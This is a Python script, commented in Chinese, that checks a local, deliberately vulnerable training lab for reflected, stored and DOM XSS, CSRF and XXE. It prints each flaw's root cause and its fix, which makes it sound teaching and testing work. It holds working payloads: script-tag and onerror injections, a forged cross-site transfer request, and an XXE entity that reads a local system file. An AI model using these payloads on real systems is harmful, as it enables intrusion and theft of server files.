#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_xsslab.py — XSS / CSRF / XXE 驗證
=============================================================================

 驗證方式的差異（本檔要示範的重點）：
   反射型 XSS → 看**回應內容**是否含未轉義標籤
   存儲型 XSS → **再查詢一次**，確認 payload 被持久化（這是它比反射型嚴重的原因）
   DOM 型 XSS → 需**執行前端 JS**才能確定；本檔用靜態分析 + 說明
   CSRF       → 看**有沒有 token / Origin / SameSite 檢查**
   XXE        → 看回應是否為**展開後的實體值**

 ⚠ 載荷僅為無害的 alert()；不涉及竊取 cookie 或對外連線。
=============================================================================
"""

import base64
import json
import os
import re
import sys
import urllib.error
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8925
BASE = "http://127.0.0.1:%d" % PORT
results = []


def req(path, method="GET", data=None, headers=None, raw=None):
    body = raw if raw is not None else (json.dumps(data).encode() if data is not None else None)
    r = urllib.request.Request(BASE + path, method=method, data=body,
                               headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, {}, str(e)


def check(name, owasp, passed, evidence):
    results.append((name, owasp, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, owasp))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def main():
    print("=" * 76)
    print(" XssLab 驗證 — XSS / CSRF / XXE")
    print(" 目標：%s" % BASE)
    print("=" * 76)
    print(" 載荷僅為無害 alert()；不涉及竊取 cookie 或對外連線")
    print("=" * 76)

    st, _, _ = req("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)

    PAYLOAD = "<script>alert(1)</script>"

    # ============ 1. 反射型 XSS ============
    from urllib.parse import quote
    st, _, body = req("/search?q=" + quote(PAYLOAD))
    reflected = PAYLOAD in body
    # 確認「真的沒轉義」：若被轉義會看到 &lt;script&gt;
    escaped = "&lt;script&gt;" in body
    ev = [
        "請求      : GET /search?q=<script>alert(1)</script>",
        "預期漏洞  : 回應中原樣出現未轉義的 <script> 標籤",
        "實際      : HTTP %s；原樣出現=%s；被轉義=%s" % (st, reflected, escaped),
        "判定邏輯  : 只有『原樣出現且未被轉義』才算 XSS 成立",
        "根因      : 輸出時未做 HTML 編碼（html_escape_unsafe 直接回傳原字串）",
        "修補方向  : 所有輸出到 HTML 的使用者輸入都必須編碼",
        "            並加上 CSP（本靶場刻意不加）",
        "驗證方式  : 看**回應內容**——這是反射型 XSS 的驗證特色",
    ]
    check("1. 反射型 XSS", "A05 / CWE-79", reflected and not escaped, "\n".join(ev))

    # ============ 2. 存儲型 XSS（關鍵：驗證持久化）============
    STORED = "<script>alert('stored-xss')</script>"
    st1, _, body1 = req("/comment", "POST", {"text": STORED},
                        {"Content-Type": "application/json"})
    stored_ok = st1 == 200
    # ★ 關鍵步驟：**重新查詢**，確認 payload 被持久化
    st2, _, body2 = req("/comments")
    persisted = STORED in body2
    ev = [
        "步驟 1    : POST /comment  {text: '<script>alert(\\'stored-xss\\')</script>'}",
        "            → HTTP %s" % st1,
        "步驟 2    : **重新** GET /comments（關鍵步驟）",
        "            → HTTP %s；payload 再次出現=%s" % (st2, persisted),
        "預期漏洞  : payload 被**持久化**，之後每次讀取都會再次輸出",
        "判定邏輯  : 存儲型 XSS 的驗證必須包含『再查詢一次』——",
        "            單純看第一次 POST 的回應不足以下結論",
        "根因      : 儲存時不處理、輸出時也不編碼",
        "危害      : **比反射型嚴重**——不需誘導點擊，任何訪客都會中",
        "修補方向  : 儲存時可保留原文，但**輸出時必須編碼**；",
        "            並加上 CSP 作為第二層防禦",
        "OWASP 對照: A05 Injection（XSS）",
    ]
    check("2. 存儲型 XSS（含持久化驗證）", "A05 / CWE-79", stored_ok and persisted,
          "\n".join(ev))

    # ============ 3. DOM 型 XSS ============
    st, _, body = req("/")
    # 找出前端 JS（base64 包裝）
    m = re.search(r'eval\(atob\("([A-Za-z0-9+/=]+)"\)\)', body)
    dom_src = ""
    if m:
        try:
            dom_src = base64.b64decode(m.group(1)).decode("utf-8", "replace")
        except Exception:                                    # noqa: BLE001
            dom_src = ""
    has_innerhtml = "innerHTML" in dom_src
    has_hash_src = "location.hash" in dom_src
    has_textcontent = "textContent" in dom_src
    ev = [
        "做法      : 取出頁面內的前端 JS（base64 包裝）並靜態分析",
        "分析結果  : 使用 location.hash 取值 = %s" % has_hash_src,
        "            寫入 innerHTML（sink） = %s" % has_innerhtml,
        "            頁面內同時提供安全對照 textContent = %s" % has_textcontent,
        "預期漏洞  : 前端把 location.hash 直接寫入 innerHTML → DOM 型 XSS",
        "測試載荷  : /#<img src=x onerror=alert(3)>",
        "關鍵差異  : **此 payload 永遠不會送到伺服器**——",
        "            它是純前端問題，伺服器日誌完全看不到",
        "驗證限制  : 要 100% 確認必須**執行前端 JS**（真實瀏覽器）；",
        "            本檔以靜態分析證明 sink 存在，並附瀏覽器驗證步驟",
        "修補方向  : 用 textContent 取代 innerHTML；",
        "            或用 DOMPurify 等函式庫淨化；並加 CSP",
    ]
    check("3. DOM 型 XSS（靜態分析 sink）", "A05 / CWE-79",
          has_hash_src and has_innerhtml, "\n".join(ev))

    # ============ 4. CSRF ============
    st0, _, b0 = req("/me")
    bal0 = json.loads(b0)["balance"] if st0 == 200 else None

    # 模擬「跨站」請求：帶上惡意 Origin
    st1, _, b1 = req("/transfer", "POST",
                     {"to": "attacker", "amount": 999},
                     {"Content-Type": "application/json",
                      "Origin": "http://evil.example.com",
                      "Referer": "http://evil.example.com/attack.html"})
    ok1 = st1 == 200
    st2, _, b2 = req("/me")
    bal1 = json.loads(b2)["balance"] if st2 == 200 else None
    changed = (bal0 is not None and bal1 is not None and bal1 < bal0)
    flag = ok1 and ("FLAG{csrf_no_token_check}" in b1)

    # 檢查 cookie 是否有 SameSite
    _, hdr, _ = req("/")
    setcookie = hdr.get("Set-Cookie", "")
    no_samesite = "samesite" not in setcookie.lower()

    ev = [
        "步驟 1    : GET /me → 餘額 %s" % bal0,
        "步驟 2    : POST /transfer（刻意帶惡意 Origin: http://evil.example.com）",
        "            body: {to:'attacker', amount:999} → HTTP %s" % st1,
        "步驟 3    : GET /me → 餘額 %s（變化=%s）" % (bal1, changed),
        "預期漏洞  : 沒有 CSRF token、也沒檢查 Origin/Referer → 轉帳成功",
        "實際      : 轉帳成功=%s；取得 FLAG=%s" % (ok1, flag),
        "Cookie    : %r" % setcookie,
        "            缺少 SameSite 屬性 = %s" % no_samesite,
        "根因      : (a) 沒有任何 CSRF token",
        "            (b) 不檢查 Origin / Referer",
        "            (c) Cookie 沒有 SameSite 屬性",
        "驗證方式  : 看**有沒有防護機制**（token / Origin / SameSite）——",
        "            這是 CSRF 的驗證特色，與 XSS 看『有沒有轉義』不同",
        "修補方向  : ① 每個狀態改變操作都需要 CSRF token",
        "            ② 檢查 Origin/Referer",
        "            ③ Cookie 設 SameSite=Lax 或 Strict",
    ]
    check("4. CSRF（無 token / 無 Origin 檢查 / 無 SameSite）",
          "A01 / CWE-352", flag and changed and no_samesite, "\n".join(ev))

    # ============ 5. XXE ============
    xxe_xml = ('<?xml version="1.0"?>\n'
               '<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///C:/Windows/win.ini"> ]>\n'
               '<r>&x;</r>\n')
    st, _, body = req("/xml", "POST", raw=xxe_xml.encode(),
                      headers={"Content-Type": "application/xml"})
    expanded = False
    parsed_text = ""
    try:
        j = json.loads(body)
        expanded = bool(j.get("entity_expanded"))
        parsed_text = (j.get("parsed_text") or "")[:120]
    except Exception:                                        # noqa: BLE001
        pass

    # 安全對照
    st_s, _, body_s = req("/xml?safe=1", "POST", raw=xxe_xml.encode(),
                          headers={"Content-Type": "application/xml"})
    safe_expanded = None
    try:
        safe_expanded = bool(json.loads(body_s).get("entity_expanded"))
    except Exception:                                        # noqa: BLE001
        pass

    ev = [
        "請求      : POST /xml（含外部實體指向本機檔案）",
        "XML 內容  : <!ENTITY x SYSTEM \"file:///C:/Windows/win.ini\"> … &x;",
        "預期漏洞  : 解析器展開外部實體 → 回應出現檔案內容",
        "實際      : HTTP %s；實體被展開=%s" % (st, expanded),
        "展開內容  : %r" % parsed_text,
        "安全對照  : GET /xml?safe=1（resolve_entities=False）→ 展開=%s" % safe_expanded,
        "根因      : lxml 以 resolve_entities=True + load_dtd=True 建立 parser",
        "★ 實測發現: **標準庫 xml.etree.ElementTree 預設會拒絕外部實體**",
        "            （ParseError: undefined entity）",
        "            → 所以 XXE 多半來自：① 第三方解析器開啟危險選項",
        "              ② 舊版解析器  ③ 開發者為支援 DTD 而關閉防護",
        "危害      : 讀取伺服器任意檔案（設定檔、金鑰、原始碼）→ 常進一步導致 RCE",
        "修補方向  : 關閉 DTD 與外部實體（resolve_entities=False, load_dtd=False）；",
        "            或改用不支援 DTD 的解析器",
    ]
    check("5. XXE（外部實體展開）", "A05 / CWE-611",
          expanded and (safe_expanded is False), "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, owasp, passed, _ in results:
        print("  %-42s %-20s %s" % (name, owasp, "漏洞存在" if passed else "未觸發"))
    print("-" * 76)
    print("  共 %d/%d 個漏洞被驗證存在" % (found, len(results)))
    print()
    print("  五種驗證方式的差異（本靶場的核心教學點）：")
    print("    反射型 XSS → 看回應內容是否含未轉義標籤")
    print("    存儲型 XSS → **再查詢一次**確認持久化")
    print("    DOM 型 XSS → 需執行前端 JS（本檔用靜態分析證明 sink）")
    print("    CSRF       → 看有沒有 token / Origin / SameSite")
    print("    XXE        → 看回應是否為展開後的實體值")
    print("=" * 76)

    with open("xsslab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "owasp": o, "present": p} for n, o, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 xsslab_result.json）")


if __name__ == "__main__":
    main()
